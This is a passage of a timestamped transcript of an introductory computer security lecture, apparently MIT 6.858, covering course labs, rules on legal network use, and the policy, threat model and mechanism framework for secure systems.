              <time_slice>2:35</time_slice>
              <text_slice>in addition to
lectures, is going</text_slice>
            </slice>
            <slice>
              <time_slice>2:36</time_slice>
              <text_slice>to be a series of
lab assignments.</text_slice>
            </slice>
            <slice>
              <time_slice>2:38</time_slice>
              <text_slice>The first one is already
posted on the website.</text_slice>
            </slice>
            <slice>
              <time_slice>2:40</time_slice>
              <text_slice>And these lab
assignments will help</text_slice>
            </slice>
            <slice>
              <time_slice>2:42</time_slice>
              <text_slice>you go through understanding
the different range of security</text_slice>
            </slice>
            <slice>
              <time_slice>2:46</time_slice>
              <text_slice>problems and how do you prevent
them in a simple web server.</text_slice>
            </slice>
            <slice>
              <time_slice>2:51</time_slice>
              <text_slice>So in lab one, which
is out right now,</text_slice>
            </slice>
            <slice>
              <time_slice>2:54</time_slice>
              <text_slice>you'll actually
take a web server</text_slice>
            </slice>
            <slice>
              <time_slice>2:55</time_slice>
              <text_slice>that we give you and find ways
to exploit buffer overflow</text_slice>
            </slice>
            <slice>
              <time_slice>2:58</time_slice>
              <text_slice>vulnerabilities in it and
take control of this website</text_slice>
            </slice>
            <slice>
              <time_slice>3:01</time_slice>
              <text_slice>by just sending it
carefully-crafted requests</text_slice>
            </slice>
            <slice>
              <time_slice>3:04</time_slice>
              <text_slice>and packets.</text_slice>
            </slice>
            <slice>
              <time_slice>3:05</time_slice>
              <text_slice>And in other labs,
you'll look at ways</text_slice>
            </slice>
            <slice>
              <time_slice>3:07</time_slice>
              <text_slice>to defend the web server,
to find bugs in the code,</text_slice>
            </slice>
            <slice>
              <time_slice>3:10</time_slice>
              <text_slice>to write worms that
run in the user's</text_slice>
            </slice>
            <slice>
              <time_slice>3:13</time_slice>
              <text_slice>browser, and other kinds of
interesting security problems.</text_slice>
            </slice>
            <slice>
              <time_slice>3:18</time_slice>
              <text_slice>One thing that
surprises many students</text_slice>
            </slice>
            <slice>
              <time_slice>3:21</time_slice>
              <text_slice>is that every lab uses
a different language.</text_slice>
            </slice>
            <slice>
              <time_slice>3:24</time_slice>
              <text_slice>So lab one is all
about C and Assembly.</text_slice>
            </slice>
            <slice>
              <time_slice>3:27</time_slice>
              <text_slice>Lab two involves a
lot of Python coding.</text_slice>
            </slice>
            <slice>
              <time_slice>3:29</time_slice>
              <text_slice>Lab three will be
something else.</text_slice>
            </slice>
            <slice>
              <time_slice>3:30</time_slice>
              <text_slice>Lab five will be JavaScript.</text_slice>
            </slice>
            <slice>
              <time_slice>3:32</time_slice>
              <text_slice>And so on.</text_slice>
            </slice>
            <slice>
              <time_slice>3:33</time_slice>
              <text_slice>This is sort of inevitable.</text_slice>
            </slice>
            <slice>
              <time_slice>3:35</time_slice>
              <text_slice>And I sort of
apologize ahead of time</text_slice>
            </slice>
            <slice>
              <time_slice>3:36</time_slice>
              <text_slice>that you're going
to have to learn</text_slice>
            </slice>
            <slice>
              <time_slice>3:37</time_slice>
              <text_slice>all these languages if you
haven't seen them already.</text_slice>
            </slice>
            <slice>
              <time_slice>3:40</time_slice>
              <text_slice>In some ways it's useful,
because the real world</text_slice>
            </slice>
            <slice>
              <time_slice>3:42</time_slice>
              <text_slice>is like this.</text_slice>
            </slice>
            <slice>
              <time_slice>3:42</time_slice>
              <text_slice>All the systems are
complicated and composed</text_slice>
            </slice>
            <slice>
              <time_slice>3:44</time_slice>
              <text_slice>of different parts.</text_slice>
            </slice>
            <slice>
              <time_slice>3:45</time_slice>
              <text_slice>And in the long run,
it'll be useful for you,</text_slice>
            </slice>
            <slice>
              <time_slice>3:48</time_slice>
              <text_slice>for your moral
character or something</text_slice>
            </slice>
            <slice>
              <time_slice>3:49</time_slice>
              <text_slice>like that, to learn this stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>3:52</time_slice>
              <text_slice>But it will take
some preparation,</text_slice>
            </slice>
            <slice>
              <time_slice>3:53</time_slice>
              <text_slice>especially if you haven't
seen these languages before.</text_slice>
            </slice>
            <slice>
              <time_slice>3:56</time_slice>
              <text_slice>It might be helpful
to start early.</text_slice>
            </slice>
            <slice>
              <time_slice>3:57</time_slice>
              <text_slice>In particular, lab
one is going to rely</text_slice>
            </slice>
            <slice>
              <time_slice>4:00</time_slice>
              <text_slice>on a lot of subtle
details of C and Assembly</text_slice>
            </slice>
            <slice>
              <time_slice>4:03</time_slice>
              <text_slice>code that we don't really
teach in other classes</text_slice>
            </slice>
            <slice>
              <time_slice>4:06</time_slice>
              <text_slice>here in as much detail.</text_slice>
            </slice>
            <slice>
              <time_slice>4:07</time_slice>
              <text_slice>So it's probably a good
idea to start early.</text_slice>
            </slice>
            <slice>
              <time_slice>4:09</time_slice>
              <text_slice>And we'll try to get the TAs
to hold office hours next week</text_slice>
            </slice>
            <slice>
              <time_slice>4:12</time_slice>
              <text_slice>where we'll do some sort
of a tutorial session</text_slice>
            </slice>
            <slice>
              <time_slice>4:14</time_slice>
              <text_slice>where we can help you get
started with understanding what</text_slice>
            </slice>
            <slice>
              <time_slice>4:18</time_slice>
              <text_slice>a binary program looks
like, how to disassemble it,</text_slice>
            </slice>
            <slice>
              <time_slice>4:21</time_slice>
              <text_slice>how to figure out what's
on the stack, and so on.</text_slice>
            </slice>
            <slice>
              <time_slice>4:25</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>4:26</time_slice>
              <text_slice>And I guess the one other
thing, we're actually</text_slice>
            </slice>
            <slice>
              <time_slice>4:29</time_slice>
              <text_slice>videotaping lectures this year.</text_slice>
            </slice>
            <slice>
              <time_slice>4:30</time_slice>
              <text_slice>So you might be able
to watch these online.</text_slice>
            </slice>
            <slice>
              <time_slice>4:33</time_slice>
              <text_slice>We'll post them as soon
as we get them ourselves</text_slice>
            </slice>
            <slice>
              <time_slice>4:35</time_slice>
              <text_slice>from the video people.</text_slice>
            </slice>
            <slice>
              <time_slice>4:37</time_slice>
              <text_slice>And the last bit
of administrivia</text_slice>
            </slice>
            <slice>
              <time_slice>4:39</time_slice>
              <text_slice>is you should, if you
have questions online,</text_slice>
            </slice>
            <slice>
              <time_slice>4:42</time_slice>
              <text_slice>we're using Piazza,
so I'm sure you've</text_slice>
            </slice>
            <slice>
              <time_slice>4:44</time_slice>
              <text_slice>used this in other classes.</text_slice>
            </slice>
            <slice>
              <time_slice>4:46</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>4:47</time_slice>
              <text_slice>So before we dive into security,
I need to tell you one thing.</text_slice>
            </slice>
            <slice>
              <time_slice>4:51</time_slice>
              <text_slice>There is a sort of rules
that MIT has for accessing</text_slice>
            </slice>
            <slice>
              <time_slice>4:55</time_slice>
              <text_slice>MIT's network when you're,
especially, doing security</text_slice>
            </slice>
            <slice>
              <time_slice>4:58</time_slice>
              <text_slice>research or playing
with security problems,</text_slice>
            </slice>
            <slice>
              <time_slice>5:00</time_slice>
              <text_slice>you should be aware that not
everything you can technically</text_slice>
            </slice>
            <slice>
              <time_slice>5:03</time_slice>
              <text_slice>do is legal.</text_slice>
            </slice>
            <slice>
              <time_slice>5:04</time_slice>
              <text_slice>And there's many things that you
will learn in this class that</text_slice>
            </slice>
            <slice>
              <time_slice>5:08</time_slice>
              <text_slice>are technically possible.</text_slice>
            </slice>
            <slice>
              <time_slice>5:09</time_slice>
              <text_slice>We'll understand how systems
can be broken or compromised.</text_slice>
            </slice>
            <slice>
              <time_slice>5:13</time_slice>
              <text_slice>Doesn't mean you should go
out and do this everywhere.</text_slice>
            </slice>
            <slice>
              <time_slice>5:16</time_slice>
              <text_slice>And there's this link
in the lecture notes</text_slice>
            </slice>
            <slice>
              <time_slice>5:19</time_slice>
              <text_slice>we'll post that has some rules
that are good guidelines.</text_slice>
            </slice>
            <slice>
              <time_slice>5:22</time_slice>
              <text_slice>But in general, if
you're in doubt,</text_slice>
            </slice>
            <slice>
              <time_slice>5:24</time_slice>
              <text_slice>ask one of the lecturers or a
TA as to what you should do.</text_slice>
            </slice>
            <slice>
              <time_slice>5:28</time_slice>
              <text_slice>And hopefully it's not too
puzzling, what's going on.</text_slice>
            </slice>
            <slice>
              <time_slice>5:34</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>5:35</time_slice>
              <text_slice>So any questions about
all this administrivia</text_slice>
            </slice>
            <slice>
              <time_slice>5:37</time_slice>
              <text_slice>before we dive in?</text_slice>
            </slice>
            <slice>
              <time_slice>5:39</time_slice>
              <text_slice>Feel free to ask questions.</text_slice>
            </slice>
            <slice>
              <time_slice>5:42</time_slice>
              <text_slice>OK.</text_slice>
            </slice>
            <slice>
              <time_slice>5:42</time_slice>
              <text_slice>So what is security?</text_slice>
            </slice>
            <slice>
              <time_slice>5:44</time_slice>
              <text_slice>So we'll start with
some basic stuff today.</text_slice>
            </slice>
            <slice>
              <time_slice>5:47</time_slice>
              <text_slice>And we'll look at just
some general examples</text_slice>
            </slice>
            <slice>
              <time_slice>5:50</time_slice>
              <text_slice>of why security is hard
and what it means to try</text_slice>
            </slice>
            <slice>
              <time_slice>5:53</time_slice>
              <text_slice>to build a secure system.</text_slice>
            </slice>
            <slice>
              <time_slice>5:55</time_slice>
              <text_slice>Because there's
not really a paper,</text_slice>
            </slice>
            <slice>
              <time_slice>5:56</time_slice>
              <text_slice>this will not have sort of deep
intellectual content, maybe,</text_slice>
            </slice>
            <slice>
              <time_slice>5:59</time_slice>
              <text_slice>but it'll give you some
background and context for how</text_slice>
            </slice>
            <slice>
              <time_slice>6:02</time_slice>
              <text_slice>to think about secure systems.</text_slice>
            </slice>
            <slice>
              <time_slice>6:04</time_slice>
              <text_slice>So security, in
general, is all about</text_slice>
            </slice>
            <slice>
              <time_slice>6:06</time_slice>
              <text_slice>achieving some goal when
there is an adversary present.</text_slice>
            </slice>
            <slice>
              <time_slice>6:13</time_slice>
              <text_slice>So think of it as there's some
bad guy out there that wants</text_slice>
            </slice>
            <slice>
              <time_slice>6:16</time_slice>
              <text_slice>to make sure you don't succeed.</text_slice>
            </slice>
            <slice>
              <time_slice>6:18</time_slice>
              <text_slice>They want to steal your files.</text_slice>
            </slice>
            <slice>
              <time_slice>6:19</time_slice>
              <text_slice>They want to delete your
entire hard drive contents.</text_slice>
            </slice>
            <slice>
              <time_slice>6:22</time_slice>
              <text_slice>They want to make
sure nothing works</text_slice>
            </slice>
            <slice>
              <time_slice>6:24</time_slice>
              <text_slice>and your phone doesn't connect,
all these things, right?</text_slice>
            </slice>
            <slice>
              <time_slice>6:27</time_slice>
              <text_slice>And a secure system is
one that can actually</text_slice>
            </slice>
            <slice>
              <time_slice>6:30</time_slice>
              <text_slice>do something, regardless
of what the bad guy is</text_slice>
            </slice>
            <slice>
              <time_slice>6:32</time_slice>
              <text_slice>trying to do to you.</text_slice>
            </slice>
            <slice>
              <time_slice>6:33</time_slice>
              <text_slice>So it's kind of cool that we
can actually potentially build</text_slice>
            </slice>
            <slice>
              <time_slice>6:35</time_slice>
              <text_slice>systems that are
resilient to a whole range</text_slice>
            </slice>
            <slice>
              <time_slice>6:39</time_slice>
              <text_slice>of bad guys,
adversaries, attackers,</text_slice>
            </slice>
            <slice>
              <time_slice>6:41</time_slice>
              <text_slice>whatever you want to call them.</text_slice>
            </slice>
            <slice>
              <time_slice>6:43</time_slice>
              <text_slice>And we can still build
computer systems that</text_slice>
            </slice>
            <slice>
              <time_slice>6:45</time_slice>
              <text_slice>allow us to get our work done.</text_slice>
            </slice>
            <slice>
              <time_slice>6:48</time_slice>
              <text_slice>And the general way to
think about security</text_slice>
            </slice>
            <slice>
              <time_slice>6:53</time_slice>
              <text_slice>is sort of break it
up into three parts.</text_slice>
            </slice>
            <slice>
              <time_slice>6:55</time_slice>
              <text_slice>One part is roughly
the policy that you</text_slice>
            </slice>
            <slice>
              <time_slice>7:00</time_slice>
              <text_slice>want your system to enforce.</text_slice>
            </slice>
            <slice>
              <time_slice>7:01</time_slice>
              <text_slice>This is roughly the goal
that you want to achieve.</text_slice>
            </slice>
            <slice>
              <time_slice>7:03</time_slice>
              <text_slice>Like well, maybe,
only I should be</text_slice>
            </slice>
            <slice>
              <time_slice>7:05</time_slice>
              <text_slice>able to read the
grades file for 6.858.</text_slice>
            </slice>
            <slice>
              <time_slice>7:09</time_slice>
              <text_slice>Or maybe the TAs as well,
and all the co-lecturers,</text_slice>
            </slice>
            <slice>
              <time_slice>7:11</time_slice>
              <text_slice>et cetera.</text_slice>
            </slice>
            <slice>
              <time_slice>7:11</time_slice>
              <text_slice>But there is some statement
about what I want my system</text_slice>
            </slice>
            <slice>
              <time_slice>7:14</time_slice>
              <text_slice>to be able to do.</text_slice>
            </slice>
            <slice>
              <time_slice>7:16</time_slice>
              <text_slice>And then, if you
want sort of think</text_slice>
            </slice>
            <slice>
              <time_slice>7:18</time_slice>
              <text_slice>about what kinds of
policies you might write,</text_slice>
            </slice>
            <slice>
              <time_slice>7:20</time_slice>
              <text_slice>typical ones have to do with
either confidentiality of data,</text_slice>
            </slice>
            <slice>
              <time_slice>7:26</time_slice>
              <text_slice>so the grades file is only
accessible to the 6.858 course</text_slice>
            </slice>
            <slice>
              <time_slice>7:31</time_slice>
              <text_slice>staff.</text_slice>
            </slice>
            <slice>
              <time_slice>7:32</time_slice>
              <text_slice>Another example of
a security policy</text_slice>
            </slice>
            <slice>
              <time_slice>7:33</time_slice>
              <text_slice>has something to
do with integrity.</text_slice>
            </slice>
            <slice>
              <time_slice>7:35</time_slice>
              <text_slice>For example, only
the course staff</text_slice>
            </slice>
            <slice>
              <time_slice>7:37</time_slice>
              <text_slice>can also modify the grades file.</text_slice>
            </slice>
            <slice>
              <time_slice>7:38</time_slice>
              <text_slice>Or only the course staff
can upload the final grades</text_slice>
            </slice>
            <slice>
              <time_slice>7:40</time_slice>
              <text_slice>to the registrar's office.</text_slice>
            </slice>
            <slice>
              <time_slice>7:41</time_slice>
              <text_slice>That'll be great.</text_slice>
            </slice>
            <slice>
              <time_slice>7:43</time_slice>
              <text_slice>Then you can also think about
things like availability.</text_slice>
            </slice>
            <slice>
              <time_slice>7:47</time_slice>
              <text_slice>So for example, a website
should be available,</text_slice>
            </slice>
            <slice>
              <time_slice>7:51</time_slice>
              <text_slice>even if the bad guys try
to take it down and mount</text_slice>
            </slice>
            <slice>
              <time_slice>7:54</time_slice>
              <text_slice>some sort of a DOS-- Denial
of Service-- attack on it.</text_slice>
            </slice>
            <slice>
              <time_slice>7:57</time_slice>
              <text_slice>So this is all well and good.</text_slice>
            </slice>
            <slice>
              <time_slice>7:59</time_slice>
              <text_slice>So these are the policies
that we might actually</text_slice>
            </slice>
            <slice>
              <time_slice>8:01</time_slice>
              <text_slice>care about from a system.</text_slice>
            </slice>
            <slice>
              <time_slice>8:02</time_slice>
              <text_slice>But because it's security,
there's a bad guy involved.</text_slice>
            </slice>
            <slice>
              <time_slice>8:05</time_slice>
              <text_slice>We need to understand,
what are we thinking</text_slice>
            </slice>
            <slice>
              <time_slice>8:06</time_slice>
              <text_slice>the bad guy is going to do?</text_slice>
            </slice>
            <slice>
              <time_slice>8:07</time_slice>
              <text_slice>And this is typically what
we call a threat model.</text_slice>
            </slice>
            <slice>
              <time_slice>8:13</time_slice>
              <text_slice>And this is basically
just a set of assumptions</text_slice>
            </slice>
            <slice>
              <time_slice>8:15</time_slice>
              <text_slice>about the bad guy or adversary.</text_slice>
            </slice>
            <slice>
              <time_slice>8:23</time_slice>
              <text_slice>And it's important to have
some sort of assumptions</text_slice>
            </slice>
            <slice>
              <time_slice>8:25</time_slice>
              <text_slice>about the bad guy because,
if the bad guy is omnipresent</text_slice>
            </slice>
            <slice>
              <time_slice>8:29</time_slice>
              <text_slice>and is everywhere at once and
you can do anything they want,</text_slice>
            </slice>
            <slice>
              <time_slice>8:32</time_slice>
              <text_slice>it's going to be hard to achieve
some semblance of security.</text_slice>
            </slice>
            <slice>
              <time_slice>8:36</time_slice>
              <text_slice>So for example,
you probably want</text_slice>
            </slice>
            <slice>
              <time_slice>8:37</time_slice>
              <text_slice>to assume the bad guy doesn't
exactly know your password,</text_slice>
            </slice>
            <slice>
              <time_slice>8:40</time_slice>
              <text_slice>or they don't actually have
physical access to your phone</text_slice>
            </slice>
            <slice>
              <time_slice>8:43</time_slice>
              <text_slice>and your keys and your laptop.</text_slice>
            </slice>
            <slice>
              <time_slice>8:45</time_slice>
              <text_slice>Otherwise, it's going to be hard
to make some sort of progress</text_slice>
            </slice>
            <slice>
              <time_slice>8:47</time_slice>
              <text_slice>in this game.</text_slice>
            </slice>
            <slice>
              <time_slice>8:50</time_slice>
              <text_slice>And turns out that while
this is actually quite tricky</text_slice>
            </slice>
            <slice>
              <time_slice>8:52</time_slice>
              <text_slice>to come up with, but I guess
one general rule is it's</text_slice>
            </slice>
            <slice>
              <time_slice>8:56</time_slice>
              <text_slice>much better err on
the side of caution</text_slice>
            </slice>
            <slice>
              <time_slice>8:59</time_slice>
              <text_slice>and being conservative in
picking your threat model,</text_slice>
            </slice>
            <slice>
              <time_slice>9:01</time_slice>
              <text_slice>because bad guy might
always surprise you</text_slice>
            </slice>
            <slice>
              <time_slice>9:03</time_slice>
              <text_slice>in terms of what they might
be able to do in practice.</text_slice>
            </slice>
            <slice>
              <time_slice>9:07</time_slice>
              <text_slice>And finally, in order to
achieve security, in order</text_slice>
            </slice>
            <slice>
              <time_slice>9:10</time_slice>
              <text_slice>to achieve our goal under
the set of assumptions,</text_slice>
            </slice>
            <slice>
              <time_slice>9:12</time_slice>
              <text_slice>we're going to look
at some mechanism.</text_slice>
            </slice>
            <slice>
              <time_slice>9:17</time_slice>
              <text_slice>And this is the, basically,
software or hardware</text_slice>
            </slice>
            <slice>
              <time_slice>9:21</time_slice>
              <text_slice>or whatever part
of system design,</text_slice>
            </slice>
            <slice>
              <time_slice>9:24</time_slice>
              <text_slice>implementation,
et cetera, that's</text_slice>
            </slice>
            <slice>
              <time_slice>9:26</time_slice>
              <text_slice>going to try to make sure
our policy is followed</text_slice>
            </slice>
            <slice>
              <time_slice>9:30</time_slice>
              <text_slice>as long as the bad guy
follows the threat model.</text_slice>
            </slice>
            <slice>
              <time_slice>9:34</time_slice>
              <text_slice>So the end result
is that, as long</text_slice>
            </slice>
            <slice>
              <time_slice>9:36</time_slice>
              <text_slice>as our threat model was
correct, hopefully we'll</text_slice>
            </slice>
            <slice>
              <time_slice>9:39</time_slice>
              <text_slice>satisfy our policy.</text_slice>
            </slice>
            <slice>
              <time_slice>9:40</time_slice>
              <text_slice>And it has to be the case that
the mechanism doesn't screw up.</text_slice>
            </slice>
            <slice>
              <time_slice>9:44</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>9:45</time_slice>
              <text_slice>Fairly high level
story about how</text_slice>
            </slice>
            <slice>
              <time_slice>9:48</time_slice>
              <text_slice>to think about
this kind of stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>9:50</time_slice>
              <text_slice>So why is this so hard, right?</text_slice>
            </slice>
            <slice>
              <time_slice>9:52</time_slice>
              <text_slice>It seems like a simple plan.</text_slice>
            </slice>
            <slice>
              <time_slice>9:53</time_slice>
              <text_slice>You write down
these three things,</text_slice>
            </slice>
            <slice>
              <time_slice>9:55</time_slice>
              <text_slice>and you're off and running.</text_slice>
            </slice>
            <slice>
              <time_slice>9:57</time_slice>
              <text_slice>But in practice, as you, I'm
sure, have seen in the world,</text_slice>
            </slice>
            <slice>
              <time_slice>10:02</time_slice>
              <text_slice>computer systems are
almost always compromised</text_slice>
            </slice>
            <slice>
              <time_slice>10:04</time_slice>
              <text_slice>in some way or another.</text_slice>
            </slice>
            <slice>
              <time_slice>10:05</time_slice>
              <text_slice>And break ins are
pretty commonplace.</text_slice>
            </slice>
            <slice>
              <time_slice>10:08</time_slice>
              <text_slice>And the big reason
why security tends</text_slice>
            </slice>
            <slice>
              <time_slice>10:12</time_slice>
              <text_slice>to be a difficult problem
is because what we have here</text_slice>
            </slice>
            <slice>
              <time_slice>10:14</time_slice>
              <text_slice>is sort of, this will be
familiar to those of you</text_slice>
            </slice>
            <slice>
              <time_slice>10:17</time_slice>
              <text_slice>took 6.033, this
is a negative goal,</text_slice>
            </slice>
            <slice>
              <time_slice>10:19</time_slice>
              <text_slice>meaning that we have to make
sure our security policy is</text_slice>
            </slice>
            <slice>
              <time_slice>10:23</time_slice>
              <text_slice>followed regardless of
what the attacker can do.</text_slice>
            </slice>
            <slice>
              <time_slice>10:27</time_slice>
              <text_slice>So just by contrast, if you
want to build a file system,</text_slice>
            </slice>
            <slice>
              <time_slice>10:30</time_slice>
              <text_slice>and you want to make sure that
my TAs can access the grades</text_slice>
            </slice>
            <slice>
              <time_slice>10:36</time_slice>
              <text_slice>file, that's pretty easy.</text_slice>
            </slice>
            <slice>
              <time_slice>10:37</time_slice>
              <text_slice>I just ask them, hey, can
you guys test and see?</text_slice>
            </slice>
            <slice>
              <time_slice>10:40</time_slice>
              <text_slice>Can you access the grades file?</text_slice>
            </slice>
            <slice>
              <time_slice>10:41</time_slice>
              <text_slice>And if they all can
access it, done.</text_slice>
            </slice>
            <slice>
              <time_slice>10:43</time_slice>
              <text_slice>The system works.</text_slice>
            </slice>
            <slice>
              <time_slice>10:45</time_slice>
              <text_slice>But if I want to say that
no one other than the TAs</text_slice>
            </slice>
            <slice>
              <time_slice>10:48</time_slice>
              <text_slice>can access the grades file,
this is a much harder problem</text_slice>
            </slice>
            <slice>
              <time_slice>10:50</time_slice>
              <text_slice>to solve, because now
I have to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>10:52</time_slice>
              <text_slice>what could all these non TA
people in the world to try</text_slice>
            </slice>
            <slice>
              <time_slice>10:56</time_slice>
              <text_slice>to get my grades file, right?</text_slice>
            </slice>
            <slice>
              <time_slice>10:57</time_slice>
              <text_slice>They could try to just
open it and read it.</text_slice>
            </slice>
            <slice>
              <time_slice>11:01</time_slice>
              <text_slice>Maybe my file system
will disallow it.</text_slice>
            </slice>
            <slice>
              <time_slice>11:02</time_slice>
              <text_slice>But they might try all
kinds of other attacks,</text_slice>
            </slice>
            <slice>
              <time_slice>11:04</time_slice>
              <text_slice>like guessing the
password for the TAs</text_slice>
            </slice>
            <slice>
              <time_slice>11:07</time_slice>
              <text_slice>or stealing the TAs laptops
or breaking into the room</text_slice>
            </slice>
            <slice>
              <time_slice>11:10</time_slice>
              <text_slice>or who knows, right?</text_slice>
            </slice>
            <slice>
              <time_slice>11:11</time_slice>
              <text_slice>This is all stuff that
we have to really put</text_slice>
            </slice>
            <slice>
              <time_slice>11:14</time_slice>
              <text_slice>into our threat model.</text_slice>
            </slice>
            <slice>
              <time_slice>11:15</time_slice>
              <text_slice>Probably for this class,
I'm not that concerned about</text_slice>
            </slice>
            <slice>
              <time_slice>11:17</time_slice>
              <text_slice>the grades file to worry about
these guys' laptops being</text_slice>
            </slice>
            <slice>
              <time_slice>11:21</time_slice>
              <text_slice>stolen from their dorm room.</text_slice>
            </slice>
            <slice>
              <time_slice>11:22</time_slice>
              <text_slice>Although maybe I should be.</text_slice>
            </slice>
            <slice>
              <time_slice>11:23</time_slice>
              <text_slice>I don't know.</text_slice>
            </slice>
            <slice>
              <time_slice>11:24</time_slice>
              <text_slice>It's hard to tell, right?</text_slice>
            </slice>
            <slice>
              <time_slice>11:25</time_slice>
              <text_slice>And as a result,
this security game</text_slice>
            </slice>
            <slice>
              <time_slice>11:27</time_slice>
              <text_slice>is often not so
clear cut as to what</text_slice>
            </slice>
            <slice>
              <time_slice>11:30</time_slice>
              <text_slice>the right set of
assumptions to make is.</text_slice>
            </slice>
            <slice>
              <time_slice>11:32</time_slice>
              <text_slice>And it's only after the
fact that you often realize,</text_slice>
            </slice>
            <slice>
              <time_slice>11:35</time_slice>
              <text_slice>well should have
thought of that.</text_slice>
            </slice>
            <slice>
              <time_slice>11:39</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>11:40</time_slice>
              <text_slice>And sort of, as a
result, this is very much</text_slice>
            </slice>
            <slice>
              <time_slice>11:42</time_slice>
              <text_slice>an iterative process.</text_slice>
            </slice>
            <slice>
              <time_slice>11:44</time_slice>
              <text_slice>And the thing you end up
realizing at every iteration</text_slice>
            </slice>
            <slice>
              <time_slice>11:46</time_slice>
              <text_slice>is, well, here's the
weakest link into my system.</text_slice>
            </slice>
            <slice>
              <time_slice>11:49</time_slice>
              <text_slice>Maybe I got the
threat model wrong.</text_slice>
            </slice>
            <slice>
              <time_slice>11:50</time_slice>
              <text_slice>Maybe my mechanism had some bugs
in it because it's a software</text_slice>
            </slice>
            <slice>
              <time_slice>11:53</time_slice>
              <text_slice>and it's going to
be large systems.</text_slice>
            </slice>
            <slice>
              <time_slice>11:55</time_slice>
              <text_slice>They'll have lots of bugs.</text_slice>
            </slice>
            <slice>
              <time_slice>11:57</time_slice>
              <text_slice>And you sort of fix them up.</text_slice>
            </slice>
            <slice>
              <time_slice>11:58</time_slice>
              <text_slice>You change your
threat model a bit.</text_slice>
            </slice>
            <slice>
              <time_slice>11:59</time_slice>
              <text_slice>And you iterate and try
to design a new system,</text_slice>
            </slice>
            <slice>
              <time_slice>12:02</time_slice>
              <text_slice>and hopefully,
make things better.</text_slice>
            </slice>
            <slice>
              <time_slice>12:06</time_slice>
              <text_slice>So one possible interpretation
of this class-- well,</text_slice>
            </slice>
            <slice>
              <time_slice>12:10</time_slice>
              <text_slice>one danger-- is that you come
away thinking, man, everything</text_slice>
            </slice>
            <slice>
              <time_slice>12:14</time_slice>
              <text_slice>is just broken.</text_slice>
            </slice>
            <slice>
              <time_slice>12:15</time_slice>
              <text_slice>Nothing works.</text_slice>
            </slice>
            <slice>
              <time_slice>12:15</time_slice>
              <text_slice>We should just give up
and stop using computers.</text_slice>
            </slice>
            <slice>
              <time_slice>12:18</time_slice>
              <text_slice>And this is one
possible interpretation.</text_slice>
            </slice>
            <slice>
              <time_slice>12:21</time_slice>
              <text_slice>But it's probably not
quite the right one.</text_slice>
            </slice>
            <slice>
              <time_slice>12:23</time_slice>
              <text_slice>The reason this is
going to come up</text_slice>
            </slice>
            <slice>
              <time_slice>12:25</time_slice>
              <text_slice>or you're going
to think this way</text_slice>
            </slice>
            <slice>
              <time_slice>12:26</time_slice>
              <text_slice>is because,
throughout this class,</text_slice>
            </slice>
            <slice>
              <time_slice>12:28</time_slice>
              <text_slice>we're going to look at all
these different systems,</text_slice>
            </slice>
            <slice>
              <time_slice>12:29</time_slice>
              <text_slice>and we're going to sort
of push them to the edge.</text_slice>
            </slice>
            <slice>
              <time_slice>12:31</time_slice>
              <text_slice>We're going to see, OK,
well, what if we do this?</text_slice>
            </slice>
            <slice>
              <time_slice>12:33</time_slice>
              <text_slice>Is it going to break?</text_slice>
            </slice>
            <slice>
              <time_slice>12:33</time_slice>
              <text_slice>What if we do that?</text_slice>
            </slice>
            <slice>
              <time_slice>12:34</time_slice>
              <text_slice>Is it going to break then?</text_slice>
            </slice>
            <slice>
              <time_slice>12:35</time_slice>
              <text_slice>And inevitably,
every system is going</text_slice>
            </slice>
            <slice>
              <time_slice>12:37</time_slice>
              <text_slice>to have some sort
of a breaking point.</text_slice>
            </slice>
            <slice>
              <time_slice>12:38</time_slice>
              <text_slice>And we'll figure out, oh hey.</text_slice>
            </slice>
            <slice>
              <time_slice>12:39</time_slice>
              <text_slice>This system, we can break
it in if we push this way.</text_slice>
            </slice>
            <slice>
              <time_slice>12:42</time_slice>
              <text_slice>And this system doesn't work
under these set of assumptions.</text_slice>
            </slice>
            <slice>
              <time_slice>12:46</time_slice>
              <text_slice>And it's inevitable
that every system</text_slice>
            </slice>
            <slice>
              <time_slice>12:48</time_slice>
              <text_slice>will have a breaking point.</text_slice>
            </slice>
            <slice>
              <time_slice>12:49</time_slice>
              <text_slice>But that doesn't mean that
every system is worthless.</text_slice>
            </slice>
            <slice>
              <time_slice>12:51</time_slice>
              <text_slice>It just means you
have to know when</text_slice>
            </slice>
            <slice>
              <time_slice>12:52</time_slice>
              <text_slice>to use every system design.</text_slice>
            </slice>
            <slice>
              <time_slice>12:54</time_slice>
              <text_slice>And it's sort of useful to
do this pushing exercise</text_slice>
            </slice>
            <slice>
              <time_slice>12:57</time_slice>
              <text_slice>to find the
weaknesses so that you</text_slice>
            </slice>
            <slice>
              <time_slice>12:59</time_slice>
              <text_slice>know when certain ideas work,
when certain ideas are not</text_slice>
            </slice>
            <slice>
              <time_slice>13:03</time_slice>
              <text_slice>applicable.</text_slice>
            </slice>
            <slice>
              <time_slice>13:04</time_slice>
              <text_slice>And in reality, this is a little
more fuzzy boundary, right?</text_slice>
            </slice>
            <slice>
              <time_slice>13:09</time_slice>
              <text_slice>The more secure you make
your system, the less likely</text_slice>
            </slice>
            <slice>
              <time_slice>13:11</time_slice>
              <text_slice>you'll have some embarrassing
story on the front page of New</text_slice>
            </slice>
            <slice>
              <time_slice>13:14</time_slice>
              <text_slice>York Times saying,
your start up company</text_slice>
            </slice>
            <slice>
              <time_slice>13:17</time_slice>
              <text_slice>leaked a million people's
social security numbers.</text_slice>
            </slice>
            <slice>
              <time_slice>13:21</time_slice>
              <text_slice>And then you pay less money
to recover from that disaster.</text_slice>
            </slice>
            <slice>
              <time_slice>13:26</time_slice>
              <text_slice>And I guess one sort of actually
positive note on security</text_slice>
            </slice>
            <slice>
              <time_slice>13:29</time_slice>
              <text_slice>is that, in many ways, security
enables cool things that you</text_slice>
            </slice>
            <slice>
              <time_slice>13:33</time_slice>
              <text_slice>couldn't do before, because
security, especially</text_slice>
            </slice>
            <slice>
              <time_slice>13:36</time_slice>
              <text_slice>mechanisms, that
allow us to protect</text_slice>
            </slice>
            <slice>
              <time_slice>13:40</time_slice>
              <text_slice>against certain classes of
attacks, are pretty powerful.</text_slice>
            </slice>
